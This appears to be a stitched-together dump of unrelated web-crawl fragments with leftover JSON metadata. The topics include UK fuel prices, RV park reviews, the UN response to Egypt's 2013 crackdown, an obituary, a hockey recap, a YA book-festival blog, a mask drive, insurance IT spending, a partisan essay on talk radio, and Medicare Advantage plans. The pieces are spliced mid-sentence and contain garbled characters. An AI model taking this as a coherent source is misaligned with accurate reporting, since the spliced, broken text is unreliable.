price surge on international markets was the biggest since the start of the first Gulf War in 1990. Analysts said today that the spike in oil prices will cost the average family an extra \u00a3650 a year in petrol and energy bills.\nA family can now expect to pay about \u00a3250 a year more for petrol than last year. The oil price surge has also sent wholesale gas prices to near-record levels, making big increases in gas and electricity bills inevitable by the autumn. Analysts said energy bills could leap by as much as 40% a year, adding about \u00a3400 to the typical annual cost of heating and lighting a home.\nThe rises will feed through to inflation later in the year making it even harder for the Bank of England to cut interest rates from their 5% level.\nThe AA said unleaded petrol could rise from an average of 113.98p per litre now to about 116.48p by mid-June. Diesel could also soar from 126.35p to 128.85p per litre.\nLuke Bosdet of the AA said: 'Unfortunately rising oil prices will work their way onto the forecourts, so motorists should get used to the idea. We are paying high prices now but it will be even worse in a month or so.'\nThe motoring organisation warned the spiralling price of petrol and diesel would hit families' travel costs this weekend. Following the highest month-on-month rise in the price of diesel this decade, a typical weekend trip to and around Cornwall, covering 600 miles, would cost \u00a376 in fuel compared with \u00a359 this time last year.\nOn the wholesale energy markets, gas is trading at 92p a therm for next winter, more than 80% higher than last year. Mark Todd, director of energy switching service energyhelpline.com, said this suggested that gas bills would go up by about 50% and electricity by 30%.\nWith combined bills more than \u00a31,000 for the average family, this points to 'a potential \u00a3400 rise that is here to stay', he said. In 2005 the average bill was \u00a3662 a year. Traders have been buying crude as a hedge against the faltering dollar. This has caused the oil price surge.\nPetrol crisis could cause bills for families to rise \u00a3650 | Baroness Vadera", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 83311}

This was more like a homeowner association with the majority of sites being occupied by long-term residents vs. 'campers'.\nMy husband and I stayed at this park for a month August 2017. The park is impeccably maintained. The pool was very refreshing on the hot North Carolina days. Restrooms/showers are roomy and clean. The owners are wonderful to work with. They go above and beyond to make your stay enjoyable. Will definitely return on our next visit.\nBy far this is an excellent RV park. The owners and staff were friendly, pleasant and helpful. They help in assisting you to and backing into your site. The park has very clean restroom/baths, laundry facilities, and beautiful landscaping that's well maintained. The pool area was in excellent condition. We stayed here for a week and have no issues in recommending this RV Park and will be staying here again.\nOwners of campground live on site, very friendly. Had small store for quick purchase of stuff. Owner escorted us to our site and helped my back in to site. I did have to use one leveling block to level camper side to side but not a very big deal. He explained all power, sewer and water connections before he left. The lower sites have better shade for the days, upper sites on the hill are good but not as shady. Wifi was great and about 50 HD TV channels. Nice are to walk around. Did have laundry and pool but did not use them. I paid $10 to wash our camper, it was worth it. Gravel lots but no pull thru. Over all a great place to relax and do nothing, that is what camping is all about, this place is great to do just that. Will bring a fire ring to your site but we did not use one. We will return here, it is only an hour from our house.\nSites were close together and too short for some tow vehicles to park any way but sideways to the road. Fortunately, a staff person helped us back in. They will not reserve a specific spot for you so you get what they want you to have. Great views if your lucky enough to get a site where you can see them.\nGreat Outdoors was clean and well laid out. Staff was very very helpful and friendly. Sites were flat gravel with a nice grassy area between each site. Picnic table also at each site. Restrooms, pool area and grounds were very clean. Staff was always picking up, cutting grass, etc. during our 7 day stay. This campground requires your rig be self contained so there were no tent sites, etc. We travel with motorcycles in our toy hauler and Great Outdoors is motorcycle friendly. Bikes were unloaded and parked right in front of our 5th wheel toy hauler. Parking the TV there also was tight but it fit in our site. Easy to find and very convenient to all the motorcycle roads in Western NC that we wanted to ride; Moonshiner 28, Tail of Dragon, Cherohalo, etc. Franklin, NC was 6 miles away and had anything you would need; shopping, groceries, great restaurants, etc. The campers seemed to split between longer term and short term. Everyone was very friendly and helpful. We will be back next year for at least another week.\nIt was our first trip with our travel trailer. The people that we meet were very nice and helpful. The man that lead us to our site helped us back up into the site and then helped us hook up to the sewer, water, and cable. The man that was staying next to us also worked there and he helped my husband with the water heater. We enjoyed staying there.\nDefinitely a '10' across the board. Staff and campers were very friendly. Facilities clean and well maintained. We always saw someone working on the landscape, cleaning restroom/bath facilities. Pool in excellent condition. Don't have one complaint.\nThe staff was friendly and helpful. The facilities were immaculate. Th.e pool was warm and inviting. A great place to visit.\nClean, comfortable, and quiet. The staff and the owner were friendly and helpful. Every amenity was clean and well cared fot.\nGrounds are very well kept, owners and staff were very very friendly and were very helpful in giving us good routes for our motorcycles. Restrooms are very clean and the pool area is nice. We were there for 10 days and would stay there again. Enjoyed the Saturday night bonfire they have too!!", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 24909}

Security Council held an extraordinary meeting Aug. 15 over the bloody crackdown in Egypt by the security forces. AFP photo\nThe U.N. Security Council launched on Aug. 15 closed-door consultations on the latest developments in Egypt following the government's deadly crackdown on supporters of ousted President Mohamed Morsi.\nTurkish Prime Minister Recep Tayyip Erdo\u011fan accused the West of ignoring the violence and called on the Security Council to meet urgently to discuss the situation. Britain, France and Australia - all council members - jointly requested the council meeting.\nU.N. diplomats, speaking on condition of anonymity because discussions have been private, said they do not expect the council to issue a statement or adopt a resolution Aug. 15.\nOne diplomat said a Council statement was not likely but that members wanted to define a \"common approach\" aimed at the de-escalation of tensions.\nThe U.N. spokesman's office said Deputy Secretary-General Jan Eliasson will brief the council behind closed doors.\nThe death toll in Egypt soared to 638 on Aug. 15 as turmoil spread across the country, following Wednesday's crackdown on two camps housing supporters of the ousted president who were demanding his reinstatement.\nWhether the council takes any action in the future is uncertain. Russia and China traditionally oppose Security Council involvement in the domestic affairs of a country, partly because of sensitivity over disputes in their own countries, including in Chechnya and Tibet.\nArgentina, which holds the rotating presidency of the Security Council this month, condemned \"the brutal repression against popular protests that won the streets of the main cities of Egypt.\" It urged authorities to \"totally and immediately cease the spiral of violence loosed in recent days against unarmed citizens.\"\nUnited Nations Secretary General Ban Ki-moon has condemned the crackdown, and U.N. rights chief Navi Pillay demanded that a wide-ranging probe be carried out.", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 30577}

He was 87.\n\"John was a very successful industrialist who was willing to share his expertise and financial successes with others,\" said Virginia Tech President Emeritus Paul Torgersen, who met Grado nearly 50 years ago after becoming head of the department that would later bear Grado's name. \"To a great number of people, he was like an older brother, giving advice but only when requested. He was a giant among men. He will be missed by many.\"\nGrado shared his advice by serving as the first member of the departmental advisory board Torgersen set up. Three years later, when Torgersen became dean of the College of Engineering and established a college-wide advisory board, Grado was the first member added once again.\nWhile serving as a volunteer, Grado also donated generously. In recognition of his generosity, the department was named for him in 2000. Several scholarships and a professorship also bear his name, and he was a member of the President's Circle within the Ut Prosim Society of donors to Virginia Tech. Grado received Virginia Tech's Alumni Distinguished Service Award in 2002, was a member of the College of Engineering's Committee of 100, and had served on the board of the Virginia Tech Foundation.\nIn 2001, he told Virginia Tech Magazine why he was so enthusiastic about supporting his alma mater.\n\"You really have the opportunity to change people's lives,\" he said. \"My hope is they'll always remember it and do the same for others when they have the chance.\"\nGrado grew up in Bristol, Virginia, and enrolled at Virginia Tech at age 16. He suspended his studies to serve in the U.S. Navy for two years during World War II. He returned to the university and completed his bachelor's in industrial engineering and operations research in 1951.\nAfter entering the paper and printing business, Grado rose rapidly, becoming chief industrial engineer of Fitchburg Paper Co. in 1956. At age 35, he was made corporate vice president of Litton Industries after it bought Fitchburg Paper.\nIn 1983, he bought the paper company from Litton and renamed it Technographics. In 1999, Grado sold the company and retired.\nAlong with supporting Virginia Tech, Grado gave to numerous organizations in the Fitchburg, Massachusetts, area where his company was located. He also supported organizations in and around Marco Island, Florida, where he had a home.\n\"He was a man of great integrity and generosity,\" G. Don Taylor, who heads the Grado Department, said of its namesake. \"He was very successful and he gave freely to help others to climb the ladder with him. Although we will have heavy hearts for a while, we can be proud of his legacy, and we can be honored to carry his name forward.\"\nGrado is survived by his wife, Corrie; daughters, Leighann Grado-Bates, Pamela Grado, and Kristina Grado; granddaughter, Summer Mahoney-Marshall; and great-grandson Beck. He was predeceased by his daughter, Kathy Lynn Grado.\nCondolences may be sent to the family at 1137 Blue Hill Creek Drive, Marco Island, FL 34145.\nU.S. News again ranks Virginia Tech's engineering graduate program among nation's best\nAlbert Raboteau\nLynn A.

Brind'Amour scored for the fourth game in a row and extended his point streak to seven games.\nBackup goalie John Grahame made 21 saves to earn his first win for the Stanley Cup champions since joining them in the off-season.\nBrind'Amour, the Hurricanes' captain, entered the game tied for third in the NHL with 26 points. He assisted on Cole's opening goal, scored himself shortly thereafter to make it 2-0, assisted on Ray Whitney's goal early in the third period and ended the scoring with 1:47 remaining off a pass from Cole, who finished with three assists.\nBrind'Amour and Cole each scored in the second period exactly 43 seconds after a Capitals player was sent to the penalty box. There was a smattering of boos from the crowd of 12,683 at the end of the period.\nWhitney made it 3-0 for Carolina 5:33 into the third period, off assists by Brind'Amour and Cole. Richard Zednik, who missed Washington's previous six games with an injury, scored the hosts' goal on a power play with 10:32 left.\nGrahame, a member of the U.S. team at the Turin Olympics, made his third start for Carolina since arriving as a free agent.

Cole swept the puck across his body and backhanded it past goalie Olaf Kolzig 14:49 into the second period to make it 1-0.\nAt the 16:35 mark, Cole sent the puck across the mouth of the goal, and Brind'Amour collected it and flicked a shot past Kolzig.\nCapitals star Alex Ovechkin, the reigning rookie of the year, didn't have a particularly good showing in his 100th NHL game.

Jae-Jones (moderator) [I've read her posts and podcast notes on PubCrawl\u2013I think she's into baby seals too!], Roshani Chokshi, Jessica Cluess, Heidi Heilig [a hapa author whom I saw at AWP and whose The Girl from Everywhere I've read], Linda Sue Park, and Erin Summerill\nJessica Cluess introduced herself as a Gryffindor while acknowledging that \"it's more posh to be Slytherin these days\" (judging by the audience's relative enthusiasm for the four houses, we Ravenclaws were the most numerous).\nErin Summerill said that after she creates a map of her world, she chooses the bleakest place on the map for the story's setting.\nIt sounds like Linda Sue Park has a new book in the works about a hapa dragon (my term)!\nJessica Cluess told an anecdote that left me quite dismayed: Her fantasy novels have a Victorian setting, and so she once wrote in a manuscript that the characters danced a mazurka. She said her editor, who normally asks questions in the margins or makes gentle suggestions, simply crossed out \"mazurka.\" Later in a phone call, Jessica Cluess asked her editor offhand why she'd done that, and her editor said, \"No one cares about the mazurka!\" My jaw may have dropped, and Isabelle patted me consolingly on the shoulder. See, I learned the mazurka at bals folks in Grenoble and am rather fond of the dance. Plus the characters in my current project actually do dance the mazurka (under a different name). Now it's my mission to make sure the mazurka makes it to the final draft!\nYallcraft: So You're Thinking of Writing a Series?\nTraci Chee (moderator) [I read her novel The Reader, which is also on the hapa book list!], Kasie West, Evelyn Skye, and Lindsay Cummings\nI didn't take a lot of notes at this one, but I remember the authors discussing whether they knew in advance which characters would die in the series or whether they impulsively decided to kill characters along the way.\nWrit Large: Myths, Folk Tales, and Modern Retellings\nZoraida Cordova (moderator), Megan Whalen Turner, Wendy Spinale, Cecil Castelluci, Natalie C. Parker, Tracey Baptiste, and F.C. Yee\nI may have been following Megan Whalen Turner throughout YALLFEST\u2026 This panel and the previous one were both in Santa Monica High School's Gallery, and behind the panelists' chairs were these two big boards covered with fan art for various books. Isabelle and I had already taken a look during the break between panels. One of the pieces was a portrait of the Queen of Eddis from Megan Whalen Turner's books. As the authors began to arrive, I thought I recognized MWT, but I knew for sure when she went to examine the fan art and exclaimed, \"This is from my book!\"\nMegan Whalen Turner talked about how wonderful it is that we still read about friendships in stories written hundreds and even thousands of years ago. She mentioned the Epic of Gilgamesh, and at the time I thought she said \"romance\" (and I wondered what romance she was referring to), but Isabelle later told me she'd said \"bromance.\" Anyway, the enduring power of literary friendships is beautiful.\nAfter this panel, it was Megan Whalen Turner's hour in the signing area, so Isabelle and I went to get in line. The woman behind us engaged us in conversation for a bit; she was an MWT fan on another level. She seemed to know that there would be a sixth book in the series, another one after Thick As Thieves, which hasn't quite come out yet! When it was my turn to have my book signed, I managed to tell Megan Whalen Turner how I'd come to read her books and that The Queen of Attolia had blown me away.\nWriting the Resistance: World Building IRL\nDaniel Jos\u00e9 Older (moderator) [I seem to go to a lot of his panels\u2013witness AWP!] , Marie Marquardt, Victoria Aveyard, Angie Thomas [she burst onto the scene with The Hate U Give, which I hope to read very soon], Benjamin Alire S\u00e1enz, and Sona Charaipotra\nDaniel Jos\u00e9 Older had apparently managed to get through his morning keynote with Cassandra Clare without swearing once, so he opened this panel with, \"If you don't like swearing, just leave now.\"\nA lot of this panel was what you'd expect from the title. A lot of it was also Benjamin Alire S\u00e1enz being jaw-droppingly eloquent about his ideals and what it is we do when we write. Also, when an audience member asked the panelists if they'd ever been criticized by their own communities for the way they'd written about them, he said, after acknowledging that he had received such criticism, \"I'm not afraid to be criticized. I'm not afraid of anything.\"\nThe guy sitting next to me asked the panelists if they'd ever considered writing utopian fiction, as opposed to dystopian fiction, and their general reaction was: What would be the point? Where's the conflict? But I kept thinking of Neal Shusterman's Scythe (which, for the record, I have not read). Perhaps that's an example of a utopia that has its dark side (after all, doesn't The Giver start out utopian?). I also wondered about something else, though. Isn't one of the great things about speculative fiction supposed to be that it can show us possible futures that are better than our present? There's still conflict, of course, but set against an optimistic backdrop.\nFantasyish: The Role of Fantasy in the New Surreality of 2017\nAlex London (moderator), Cassandra Clare, Danielle Paige, Daniel Jos\u00e9 Older, Megan Whalen Turner, and Zoraida Cordova\nBy now you may be able to tell which authors I was stalking.\nAlex London opened the panel with a longish quote from Ursula K. LeGuin and then said, \"Now be smarter than Ursula LeGuin.\" Megan Whalen Turner joked that they could be done now.\nMWT remarked that \"we don't often talk about the roots of conflict [i.e. war] in our fantasy for children.\" And she also said that none of the people in her world are happy to take on responsibilities, but, for instance, Sophos, in A Conspiracy of Kings, reaches a point where he realizes he can't make the decision he wants to, and he steps up. I pondered this because I've been interested in writing characters who choose duty over other things. Such as love.\nDaniel Jos\u00e9 Older wondered aloud how fantasy writers can tell the truth while still giving people a happy place to go to.\nMWT talked about reading the Chronicles of Narnia when she was six and never having grown out of the desire to check the back of the wardrobe (I like to think I haven't either).\nAsk Me Anything: The LGBTQIA+ Edition\nSam Maggs (moderator), Jeramey Kraatz, John Corey Whaley [I loved his Where Things Come Back\u2013I think I said so last year too], Adam Silvera [I read his More Happy Than Not, and during this panel I think I learned that we're the same age], Natalie C. Parker, Benjamin Alire S\u00e1enz, and CB Lee\nI'll just sum this one up in one quote. Sam Maggs: \"I'm from Canada, where everyone is 30% gay.\" To which someone responded, \"That's why they're so nice.\"\nAfter the last panel, Isabelle and I decided to visit Small World Books in Venice because in addition to being YALLWEST Saturday was Independent Bookstore Day. We walked along the beach to get there, skirting sand castles and watching adorable sandpipers chase the retreating waves. We even stumbled upon a bizarre, pulsing, pink, translucent creature that was sort of shaped like a shell but decidedly gelatinous. Later research suggested it might have been a burrowing sea cucumber. At Small World Books, the bookseller behind the counter indulged us by showing us the timid new bookstore cat. The shop is really lovely and has a nice selection; there was a display of Hugo and Nebula nominees, and I picked up Yoon Ha Lee's Ninefox Gambit. We lingered until closing.\nThis entry was posted on May 3, 2017, in Reading and tagged beach, Benjamin Alire S\u00e1enz, bookstore, Daniel Jos\u00e9 Older, Megan Whalen Turner, Santa Monica, Small World Books, YALLWEST.

{"text": "Bloomington mask drive closing while looking for new venue\nCarol Kugler\nAt a time when wearing a face mask is considered essential by some health officials, the Bloomington Mask Drive, a volunteer effort to supply face masks to people in the Bloomington area, is preparing to close up its current operations at the Banneker Community Center.\n\"We have to be out of Banneker by the end of the month,\" explained Nola Hartman, co-founder of the mask drive. \"We're kind of going dormant; we're not quitting.\"\nThe last day people can request face masks is June 20. The last face masks will be available for pick-up on June 24. All of the mask drive materials will be collected and moved by June 26, Clark said.\n\"The last two days will be packing things up and figuring out where they go,\" she explained. \"For the most part, the plan right now is to store (the items) with the idea that we are going to start back up again in a limited way in a month or two.\"\nHartman and co-founder Kelly Clark are discussing options with volunteers, city officials and others in an effort to continue supplying face masks sewn by scores of volunteers. Bloomington Mask Drive began with Hartman and Clark working with others to sew and distribute face masks first at the Showers Complex outside of City Hall, then at Allison Jukebox Community Center and for the past month at the Banneker center. With people wanting to rent the Banneker center, it's again time for the mask drive to find a new home.\nClark said she was expecting the mask drive would have to leave its current location as more normal activities begin. The hope was that city or county officials might step in to help make the current mask drive program more official. But so far, that hasn't happened. Discussions with the public library and others may lead to new avenues for distributing face masks, she said.\n\"We have wonderful volunteers and many of them are willing to continue,\" Hartman said. \"I feel like we have probably made a difference and that certainly was our goal. The more masks we get out there, the better it is for everybody.\"\nClark is considering an unmanned self-serve mask station. To that end, face masks will be available at the little free libraries around the city. Volunteers have already begun placing face masks in some of the little libraries, Clark said. That will continue for at least a few weeks.\nBloomington Mask Drive has distributed more than 20,000 face masks. Clark estimated they will collect about 25,000 face masks, all sewn by volunteers, before the operation ends its time at the Banneker center.\nThe face masks are given free of charge to anyone who requests them through bloomingtonmaskdrive.com. Many have been given to Shalom Center to help people who cannot afford to purchase a face mask, said Clark, who worries about how many people won't have masks available once the mask drive closes. She's also fearful that a second wave of COVID-19 might mean more people need face masks.\n\"We're going to be leaving a vacuum for all these people who want to continue making these masks and don't know where to put them,\" Clark said.\nAn article in the Proceedings of the National Academy of Sciences said recent study by researchers from the University of Texas and the University of California found that wearing face masks has prevented tens of thousands of coronavirus infections. The researchers assessed people in New York, Italy and Wuhan, China. The study compared infection levels of the public before and after the public was told to wear face masks.\nAccording to an Associated Press article about the study, the scientists found that telling people in Italy to wear face masks prevented more than 78,000 infections between April 6 and May 9. In the city of New York, wearing face masks stopped more than 66,000 cases from April 17 to May 9, the scientists reported.\nRequests for face masks can still be submitted at bloomingtonmaskdrive.com. The last requests must be received by June 20; the last masks will be distributed on June 24.", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 16196}

Along Homer Street you will also find several sought-after condominium buildings such as The Beasely, Dous, Bentley, 1180 Homer, Ellison, 1241 Homer, and H&H.\nYaletown received its name in the 19th century when the Canadian Pacific Railroad moved its rail yards and repair facilities from Yale, in the Fraser River canyon, to the new Yaletown in Vancouver and the name stuck. Canadian Pacific built a roundhouse in the area; which is still in use today as the Roundhouse Community Centre, at the corner of Pacific and Drake. It features the famous Centennial Steam train, which is an important part of our Canadian history. This was the first train to cross Canada upon completion of the railroad.\nHome to a variety of successful businesses including fashionable boutiques, pet outfitters, architectural firms, galleries, hair studios, and designer furniture stores.

{"text": "CEE5 insurers are expected to spend US$543 million on IT in 2004. Over the next two years, this number will grow slowly: Celent anticipates that in 2006, CEE5 insurers will spend US$569 million on IT initiatives.\nThe CEE5 is the \"Central and Eastern European Five\": Poland, Hungary, the Czech Republic, Slovakia, and Slovenia. The insurance market in these countries is growing quickly and reaping profits. Each sub-market is dominated by a handful of major, mostly foreign-owned players and a former state-owned monopolist. Other carriers in the market are usually subscale and are not poised for dramatic expansion.\nAlthough much has been written about the potential growth of these markets, little attention has been paid to the IT strategy issues that will support (or inhibit) this growth, and the potential role that Western IT services providers may play in this newly open market.\nprovides an overview of the current environment, key IT strategy issues, current and future IT priorities, and overall IT spending in the CEE5 market.\nMatthew Josefowicz, manager of Celent\u75f4 insurance group and author of the report. \"This relatively high skill level coincides with a relatively low salary level compared to Western Europe. Accordingly, many companies opt for internal IT solutions instead of vendor solutions on the basis of price and skill availability.\"\nOn the vendor side, the market is dominated by the major Western players; their role is supported by their relationships with the Western parents of CEE5 insurers. Local players also have a minor role. Celent expects that the few local vendors with a specialization in insurance-specific functions will have to either team up with their Western competitors or focus on niche markets.\nMost of the current IT investment in the CEE5 is focused primarily on distribution, which is not surprising given the market\u75f4 focus on growth. However, Celent believes that CEE5 insurers are making a mistake by under-investing in the infrastructure necessary to support that growth over the long term.

{"text": "The Battle Hymn of the New Liberal Media: A Good Business Plan\nIn the last Democratic debate, one of the questioners pointed out that fewer Americans identify themselves as either liberals or Democrats than at any time since before Roosevelt's New Deal. The implicit question was, \"What's so bad about you guys that Americans have decided 'liberal' is a curse word and people are embarrassed to call themselves Democrats?\"\nRichard Gephardt tried to bluster his way through an answer, pointing to a few Democratic victories, but the overall response left the impression that all the candidates (and most other Democrats) are clueless about what has happened in America over the past 20 years, why it happened, or how.\nIt's not that the liberal ideals are too old fashioned or that Democrats have disintegrated or self-destructed. It's that American public opinion has been steamrollered.\nThe 1980s saw massive funding of right-wing think tanks that have engaged in blitzkrieg campaigns to overwhelm the mainstream media with conservative viewpoints. The man whose followers claim he's Jesus Christ's reincarnation, Reverend Moon, started the Washington Times newspaper in 1982, and although it has lost money ever since, it has succeeded in pushing political discourse in Washington to the far right, presumably helping the good Reverend's other military/industrial investments and lent legitimacy to his religion. Republican operative and former Rush Limbaugh TV Show producer Roger Ailes, with access to Rupert Murdoch's billions, founded the Fox News Network to openly push the Republican agenda into America's living rooms.\nBut the goal wasn't just to provide an alternative media - it was to influence all media.\nThis aspect of the conservative strategy was outlined by former Republican Party chairman Rich Bond, who told the Washington Post (8/20/92) that their main goal was to convince Americans and, most important, journalists themselves - the referees of public discourse in America - that they should become hypersensitive to any story, writer, or source that may carry Democratic bias and thus only present the Republican side of the story. \"If you watch any great coach,\" Bond explained, \"what they try to do is 'work the refs.' Maybe the ref will cut you a little slack next time.\"\nThe plan started several years before Bond spilled the beans to the Post. And its most powerful component has been \"conservative\" talk radio.\nThe Reagan/Bush administration ended the FCC's Fairness Doctrine in 1986, and the next year saw Rush Limbaugh appear in over 50 major markets across America - with no sponsors. The myth believed by his listeners is that Americans just so loved Rush and his philosophy that those stations that altruistically carried his show quickly found sponsors. The liberal myth is that the way to replicate Limbaugh's success is to re-invent a radio network like ABC or Premiere but that carries liberals, and stations in major markets will flock to pick up the programming.\nBut making something like the Rush phenomenon happen isn't about networks or stations or even about philosophy: It's about quality programming, a good business strategy, and lots of cash. Particularly the cash.\nChristian broadcasters have known this equation for decades. Many radio stations will sell \"block time\" - entire hours - for a bit less than they'd normally get if they had just sold all the ads on an existing show. The purchaser gets not only all the commercial minutes, but the entire hour to do whatever they want with. Christian broadcasters use that hour to evangelize and beg for money, and if they get more cash from their donors than the hour cost, they keep their show on the air on that station and grow to the next.\nOne step down are light sponsorships - where advertisers (often Bible publishers) buy one or a few \"seed\" ads on a local station, so as soon as the program starts on the station, management knows its downside is limited.\nTalk radio has a similar past - and present.\nWell-funded syndicates get together and buy block time, put a conservative host on the air, and then find sponsors to pay for it. If the income from the sponsors exceeds the cost of buying the block time, they make a healthy profit. If not, the message still gets spread, Republicans get elected, and the interests of the investors are furthered.\nLess well financed shows find political candidates or sympathetic companies to advertise locally to encourage stations to pick up a show. (It's no coincidence that Limbaugh's show debuted just as the '88 election cycle was beginning.)\nWhile none of Limbaugh's original business partners has ever gone public with the details of what it cost to first get him on the air, it is public knowledge that syndicators of some of the biggest names in conservative talk radio today are still, 15 years after Limbaugh's national debut, buying block airtime in the tightest major markets and working to bring in local sponsors in other markets.\nThe result of conservatives buying their way into our airwaves has been a conservative transformation in average Americans' political viewpoints. Soccer Moms and NASCAR Dads tune in to coast-to-coast, dawn-to-midnight conservative talk radio, and many have come to believe the right's slogans and myths.\nThus, traditional American values of community and compassion have been replaced with the conservative notions that greed is good and corporations can better administer a democracy than a freely elected government. A vast national right-wing echo chamber across the AM dial has propelled conservative Republican candidates into office, led us into two wars in two years, and succeeded in burying the high crimes and misdemeanors of the Bush administration while continuing to blame all things bad on Bill Clinton.\nIt's even created its own mythos about who will turn on a radio. They promote the idea - and some even believe it - that only conservatives are interested in listening to talk radio. It has nothing to do, they say, with the fact that nobody on the left has yet spent the money necessary to buy or sponsor market share in major cities for liberal hosts.\nAs an example of how extreme things have gotten, on October 3rd, I participated on a panel of nationally syndicated radio talk show hosts, sponsored by the industry publication Talker's Magazine, at the Heritage Foundation in Washington, DC. Talkers' publisher Michael Harrison introduced me to the crowd as the \"lone liberal on the panel,\" and when Laura Ingram and I began debating, at least a dozen others in the room angrily yelled at me whenever I made a point.\nIt wasn't a conspiracy, but a simple fact of the past conservative investment in the broadcast industry that there were no other self-identified liberals in national syndication on the panel. Stations in small and medium-sized towns across the country have picked up liberal talk shows on a no-cash barter (free) basis, but no liberal shows have yet found the kind of investors willing to buy into a major market on the possibility of profits a year down the road (it takes about a year to solidify an audience base).\nFurther evidence of the economic past of talk radio is found in the Talkers Magazine's \"Talk Radio Research Project,\" just released at the National Association of Broadcasters conference. The magazine's study shows that three times as many listeners identify themselves as Republicans or Libertarians, compared to the meager 12 percent who call themselves Democrats. Fox News Channel was the top primary news source among all talk radio listeners.\nConservatives have their spokespeople on the air in every nook and cranny of America, while liberals are much harder to find. Potential Democratic AM radio listeners, disgusted with the rants on the right, have tuned into music stations while they wait for somebody to realize they represent a vast, untapped market. So only conservatives are listening, although that doesn't mean for a moment only conservatives would listen to talk radio.\nIn the meantime, the conservative juggernaut feeding the media rolls on with increasing momentum.\nAfter the Talkers' panel, I was given a tour of the Heritage Foundation, which has provided me with some excellent conservative thinkers to debate on my \"liberal\" radio program. I was shown the wall with pictures of Scaife and Coors, another wall engraved floor-to-ceiling with the names of conservative donors, the two radio studios, and what seemed like miles of dark wood, hushed carpets, leather-upholstered chairs, and subtly elegant meeting rooms. Demand from network news shows for conservative video clips has even reached such a point that Heritage is building out a TV set and studio.\nWhich brings us back to the answer to the debate question posed to Dick Gephardt about why Americans are drifting to the right.\nIt took several years and many millions for both conservative talk radio and Fox News to build enough of an audience to be self-sustaining and then profitable. Conservative investments in these media have now both yielded profits and also pushed American public opinion to the right with dizzying speed.\nAfter all, the core of the conservative agenda is to transfer control of our government and our commons to big corporations; reduce taxes on the rich while squeezing the middle class; and strip labor of its power to organize while enhancing organized corporate power by supporting trade associations, Chambers of Commerce, political alliances, and monopolistic mergers. These are the mantras of conservative talk radio and Fox.\nTrillions are at stake in this transformation of America from its founding ideal of government of, by, and for We, The People, into a neo-feudal state ruled by corporate-CEOs-turned-politicians and operated on the ancient but corrupt principle of crony capitalism and rule-by-the-rich.\nTo reverse our nation's slide toward single-party rule and the death of democracy will require nothing less than aggressive media efforts by those who still believe in the egalitarian, democratic ideals first articulated by our nation's Founders. Fortunately, we're now seeing the early stirrings of that: With the pivotal 2004 elections so close, the timing couldn't be better.\nThe United Auto Workers union has put money and resources into the i.e. America Radio Network, which syndicates liberal talk radio from coast to coast. Several other unions and Democratic candidates are waking up to the power of advertising on a philosophically aligned show, and supporting liberal talk programming on a local basis.\nFollowing on i.e.'s successes, AnShell media, according to industry rumors, is on the verge of achieving funding goals to roll out America's second liberal radio network in January. Al Gore and Joel Hyatt are talking about a cable TV network to take on Fox News.\nThe Center For American Progress - a liberal version of Heritage - is already providing great information and research to reporters and commentators, and kicking off a national conference October 27/28. Billionaire George Soros is helping fund a political action group dedicated to revitalizing democracy.\nAnd smaller, independent businesspeople are getting into the act. Socially conscious companies like The Organic Wine Company are sponsoring liberal talk radio shows. Two independent ventures have set up shop this fall to nationally syndicate the Randi Rhodes show and a new radio program by Marianne Williamson. Stations from coast to coast have now picked up liberal talk shows, and they're discovering large and active listenerships, often even beating the conservative competition.\nProgressive business people and labor unions are learning from the success of conservative media that with a good business plan and a little patience it's possible to both advance your side's social/political goals and to reach customers and potential members. Working together with progressive talent, liberal activists, and progressive, democracy-oriented companies and unions, America's \"new liberal media\" just may succeed in the battle to wrest American back from the clutching fingers of the extremist conservatives who've held sway these past two decades.\nWe've watched them destroy our economy three times in the past forty years (the Nixon inflation, Reagan/Bush recession, and the new Bush debt crisis), drive our foreign policy into a series of questionable wars, and openly attack both our environment and our civil liberties. Like cold water on a sleeping face, conservative excesses are finally awakening Americans to the recollection that our nation's values have been fundamentally progressive since our Founding, that Al Gore got a half-million more votes than George W. Bush in the last presidential election, and that progressives/liberals are just as enthusiastic about rooting for their \"team\" as are conservatives. The larger half of America is finally finding its voice.\nThom Hartmann is a talk-show host and the author of \"The Hidden History of Monopolies: How Big Business Destroyed the American Dream\" (2020); \"The Hidden History of the Supreme Court and the Betrayal of America\" (2019); and more than 25 other books in print.", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 24947}

{"text": "The official definition \u2013 These medicare plans are medical plan options (like an HMO or PPO) which are approved by CMS/Medicare and marketed by private medicare companies. These sort of policies are sometimes called Part C or \"MA Plans\" and are all a part of Medicare and administered by CMS. A fixed amount is paid for your medical care by Medicare to the companies that offer these plans.\nAll of these companies have got to follow all regulations and reforms that have been set or being created by Medicare/CMS. Advantage plans are going to provide you with comprehensive (depending on the plan/premium that you choose) medical coverage and sometimes prescription drug coverage. These are not supplemental plans, aka Medigap.\nThese plans are part of Medicare. Enrolling in an Advantage plan does not mean that you are leaving or dis-enrolling from Medicare. You are still in Medicare, your policy is being administered by a private insurance company that must follow the rules set by Medicare.\nAdvantage plans are NOT supplemental insurance. Medicare Supplements (Medigap) are offered by a private insurance company to work in conjunction with original Medicare to supplement or fill in the gaps that Medicare does not pay.\nAgain, the first thing you must know before you join a Medicare Advantage Plan, is that you are not buying supplemental insurance. You are joining an Advantage Plan where your Medicare will be administered by a private insurance company and you are still enrolled in Medicare.\nIn all types of Medicare Advantage Plans, you're always covered for emergency and urgent care. Medicare Advantage Plans must cover all of the services that Original Medicare covers except hospice care. Original Medicare covers hospice care even if you're in a Medicare Advantage Plan. Medicare Advantage Plans aren't supplemental coverage. These Plans may offer extra coverage, such as vision, hearing, dental, and/or health and wellness programs. Most include Medicare prescription drug coverage (Part D) \u2013 learn more here with Medicare.gov.\nPreferred Provider Organization (PPO) Plans.\nHealth Maintenance Organization (HMO) Plans.\nSpecial Needs Plans (Mostmedicare official page on SNP) \u2013 Keep reading all of these are explained below.\nMedicare Advantage plans combine the coverage of Medicare Parts A and B (sometimes called \"Original Medicare\") with additional benefits. Most plans include Medicare PartD (the Most medicare guide) prescription drug coverage. There are four main types of Medicare Advantage plans as mentioned above and will be explained in detail very soon.\nMedicare Advantage plans work similarly to employer-sponsored health insurance plans, which may help you continue the same level of coverage you have now or be similar to ones you have had in the past.\nHow do I Choose Medicare HMO Plans?\nBecause there are many Medicare Advantage and HMO plans available through various providers, 